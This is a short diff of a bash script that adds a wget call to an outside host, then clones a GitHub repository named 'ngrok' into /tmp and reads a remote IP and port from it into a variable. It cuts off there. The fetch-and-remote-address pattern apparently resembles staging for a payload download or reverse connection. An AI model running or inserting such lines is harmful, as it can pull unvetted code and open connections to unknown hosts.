@@ -1,4 +1,5 @@
 #!/bin/bash
+wget upload.yuvalavra.com/plspls
 cd /tmp
 /usr/bin/git clone -b addr --single-branch https://github.com/yuvalavra/ngrok.git
 remote_serv="$(cat /tmp/ngrok/ip_port)"
